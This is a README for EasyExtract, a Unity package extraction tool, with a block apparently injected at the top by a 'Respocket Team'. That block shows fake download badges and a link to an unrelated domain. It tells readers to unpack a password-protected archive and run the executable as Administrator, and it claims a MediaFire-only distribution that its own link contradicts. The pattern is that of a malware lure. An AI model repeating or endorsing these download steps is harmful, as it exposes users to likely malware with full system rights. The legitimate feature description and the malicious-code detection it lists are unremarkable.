<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# EasyExtract.net

<div align="center">
  <img src="docs/images/main-window.png" width="100%" alt="EasyExtract Desktop App"/>
  
  <br/>
  
## What is EasyExtract?

EasyExtract is the ultimate tool to unpack, inspect, and manage Unity packages (`.unitypackage`) **without ever opening the Unity Editor**. The web app also opens `.zip` and `.tar` archives that contain a package.

Whether you are a developer checking assets or a power user managing a massive library, EasyExtract has you covered: a browser app for quick jobs and a cross-platform desktop app (built with **Avalonia**) for big local libraries.

**Choose your weapon:**
* **Web App:** The fastest way to start. Instant, no-install extraction directly in your browser.
* **Desktop Client:** Free offline extraction, auto-updates, system-wide search, a duplicate finder, and deep integration.
* **Discord Bot:** Scan a single package with `/analyze`, right inside the EasyExtract Discord server.

---

## Download & Quick Start

### Web Version
*The fastest way to get value.*

### Desktop App (Windows, macOS, Linux)
*Free offline extraction with auto-updates.*

## Desktop Features (Power User)

The Desktop app is built for speed and safety on **.NET 10** and **Avalonia**.

### Smart Extraction Workflow
* **Auto-Updates:** Integrated **Velopack** keeps the app up to date (can be switched off in Settings).
* **Batch & Queue:** Queue as many packages as you like via drag & drop, the file picker, search results, or the command line (`--extract <files>`).
* **Live Progress:** The dashboard shows the current package and asset, assets extracted, elapsed time, and what is next in the queue.
* **Selective Extraction:** Open a package in the preview, tick only the assets you need, and extract just those. Single assets can be exported directly.
* **Organized Output:** Default output and temp folders, optionally sorted into category folders.
* **Extraction Limits:** Per-asset, per-package, and asset-count caps (512 MB, 32 GB, and 25,000 by default, all adjustable) stop bloated or malicious packages before they fill your disk.
* **Offline First:** Extraction runs entirely on your machine. With a connection, the app checks for updates, adds a short record of each run (file name, size, status, duration) to your web dashboard, and reports crashes automatically.

### Discovery & Global Search
Stop digging through folders. EasyExtract finds your packages instantly.
### Library Tools
* **Duplicate Finder:** Pick a folder and EasyExtract fingerprints every asset in its packages by content (SHA-256), so you see what you store more than once, even under different names.
* **History & Analytics:** A persistent history with daily activity, a throughput chart, and a timeline of recent runs.
* **Web Dashboard:** One click links the app to your easyextract.net dashboard, so the browser and the app share the same extraction history.

### Preview & Security (Anti-Malware)
Don't import blind. Know what's inside.
* **Rich Previews:** Browse the package as a searchable tree, then inspect images, PDFs, and text, play WAV, MP3, and AIFF audio, and view 3D models (OBJ, FBX, DAE, 3DS, STL, DXF, and prefabs that reference them) *before* extraction.
* **Malicious Code Detection:** Optional scan (turn on "malicious code warnings" in Settings) of `.cs`, `.js`, `.boo`, and `.dll.txt` assets up to 5 MB each. It flags Discord webhooks, links outside a list of known domains, and risky calls such as `Process.Start`, registry access, file deletion, sockets, reflection, and `DllImport`.
* **Safety Banners:** Visual warnings in the dashboard if a package contains threats.

### UX & Integrations
* **Customizable:** Light/Dark themes (or follow the system), custom background images (local/URL), and opacity controls.
* **Discord Rich Presence:** Shows what you are extracting, your queue, and your totals.
* **System Integration:** "Extract with EasyExtract" context menu entry in Windows Explorer, Linux file managers, and the macOS Services menu (on by default, toggle in Settings).
* **Notifications & Sounds:** Notifications for finished extractions, plus optional sound cues.
* **Feedback:** Send ideas and bug reports straight to the developer from inside the app.
* **UwU Mode:** Don't ask, just toggle it in settings.

---

## Web App Features

* **Zero Install:** Runs in your browser. The package is unpacked locally and never uploaded; only its file name and size go to the server to check your quota.
* **More Than .unitypackage:** Also opens a `.zip` or `.tar` that contains a package. Packages can be up to 512 MB (2 GB unpacked, 25,000 assets, 256 MB per asset); bigger ones are a job for the desktop app.
* **Review & Pick:** See every file under its real path, search the list, and extract all of it or only what you pick, into a folder or as a ZIP download.
* **Asset Preview Gallery:** Thumbnails of the package's assets. The first 12 are free; any paid plan unlocks the rest (up to 400 previews per package).
* **Live Speed & ETA** while a package extracts.
## Feature Comparison

| Feature | Web Version | Desktop App |
| :--- | :---: | :---: |
| **Platform** | Browser | **Windows, Linux, macOS** |
| **Setup** | **Instant** | One-Click Installer (Auto-Update) |
| **Account History** | **Yes** | Local history, linkable to the web dashboard |
| **Free Limit** | **3 extractions or 1 GB / 30 days** | Completely free |
| **Paid Upgrade** | **10 more for €2, Premium Web €15/month** | None |
| **Size Limits** | 512 MB per package | Adjustable (32 GB per package by default) |
| **Previews** | Thumbnail gallery, first 12 free | **Images, PDFs, text, audio, 3D models** |
| **Malware Scan** | Webhooks, links, risky APIs | Webhooks, links, risky APIs (opt-in) |
| **Live Progress** | **Speed & ETA** | Package, asset, and elapsed time |
| **Batch Processing** | Good for quick jobs | **Best for large local queues** |
| **Duplicate Finder** | No | **Yes** |
| **Package Diff** | **Yes** | No |
| **System Search** | No | **Yes** |
| **Offline Access** | No | **Yes** |
| **Context Menu** | No | **Yes** |
| **Cost** | Free to start, paid for unlimited | **Free** |

---

## Gallery

### Extraction History
<div align="center">
### Settings & Themes
<div align="center">
### Web Interface
<div align="center">
  <img src="docs/images/web-extractor.png" width="100%" alt="Web extractor on easyextract.net" />
</div>

<br/>


---

MIT License

Copyright (c) 2021-2026 Noah Beuge (HakuSystems)

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
